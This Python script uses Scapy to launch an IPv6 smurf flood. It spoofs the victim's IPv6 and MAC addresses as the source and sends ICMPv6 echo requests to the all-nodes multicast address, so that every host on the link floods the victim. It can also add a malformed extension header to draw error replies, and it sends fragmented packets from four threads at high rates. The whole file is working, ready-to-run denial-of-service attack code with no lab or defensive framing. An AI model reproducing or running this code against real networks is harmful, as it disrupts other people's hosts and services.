#!/usr/bin/python3
import argparse
import logging
import sys
import threading

import netifaces
import psutil
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, fragment6, IPv6ExtHdrDestOpt, HBHOptUnknown, Pad1
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendpfast
from scapy.volatile import RandString, RandShort

from validate_parameters import is_valid_ipv6, is_valid_mac, is_valid_port, payload


def main():
    parser = argparse.ArgumentParser(description="|> Triggering smurf attack to a specified target (using other hosts to "
                                                 "flood the target).")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender.")
    parser.add_argument("-tmac", dest="target_mac", action="store",
                        help="the MAC address of target (resolved from the interface if skipping).")
    parser.add_argument("-tip", dest="target_ip", action="store",
                        help="the IPv6 address of target.")
    parser.add_argument("-l", dest="data_length", type=int, action="store", default=1000,
                        help="the size of data in bytes (1000 if skipping).")
    parser.add_argument("-mf", dest="malform", action="store_true", default=False,
                        help="send ICMPv6 packets with unknown Option to cause Parameter Problem.")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target IPv6 address
    if args.target_ip is None:
        print("---> IPv6 address of the target is required!!!")
        sys.exit(1)
    if args.target_ip is not None:
        if not is_valid_ipv6(args.target_ip):
            print("---> The given target IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target MAC address
    if args.target_mac is None:
        args.target_mac = get_if_hwaddr(args.interface)
    if args.target_mac is not None:
        if not is_valid_mac(args.target_mac):
            print("---> The given target MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the size of Payload data
    if args.data_length is None:
        args.data_length = 1000
    if args.data_length is not None:
        if not is_valid_port(args.data_length):
            print("---> The given size of data is invalid. Try again!!!")
            sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    # Generate the packet
    stats = psutil.net_if_stats()
    mtu = stats.get(args.interface).mtu
    data = payload(args.data_length)
    id = RandShort()

    pkt_list = []
    print("Triggering the smurf attack to the target: " + args.target_ip + " (press Ctrl+C to stop the attack).....")
    if not args.malform:
        packet1 = Ether(src=args.target_mac) / IPv6(src=args.target_ip, dst="ff02::1", hlim=255) / \
                  ICMPv6EchoRequest(id=id, data=data)
    if args.malform:
        wrong_extension = IPv6ExtHdrDestOpt(options=[HBHOptUnknown(otype=128)] + [Pad1()] + [Pad1()] + [Pad1()])
        packet1 = Ether(src=args.target_mac) / IPv6(src=args.target_ip, dst="ff02::1", hlim=255) / wrong_extension / ICMPv6EchoRequest(id=id, data=data)

    if len(data) > mtu:
        packet1 = fragment6(packet1, mtu)
    for i in range(200):
        pkt_list.append(packet1)

    def send_packets(packet, iface):
        try:
            sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
        except KeyboardInterrupt:
            pass

    threads = []
    for i in range(4):
        thread = threading.Thread(target=send_packets, args=(pkt_list, args.interface))
        threads.append(thread)
        thread.start()

    # wait for all threads to complete
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # If KeyboardInterrupt is raised in the main thread, stop all child threads
        threading.Event().set()
        sys.exit(0)